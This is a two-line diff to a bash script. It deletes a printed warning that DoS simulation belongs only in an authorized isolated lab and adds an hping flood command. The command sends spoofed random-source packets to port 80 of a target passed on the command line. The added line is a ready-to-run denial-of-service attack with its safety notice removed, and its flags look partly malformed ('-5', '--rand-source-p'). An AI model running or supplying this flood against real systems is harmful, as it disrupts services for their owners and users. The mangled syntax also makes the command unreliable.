@@ -1,2 +1,2 @@
 #!/bin/bash
-printf "DoS simulation must only be performed in an authorized isolated lab."
+hping -5 --flood -V --rand-source-p 80 $1
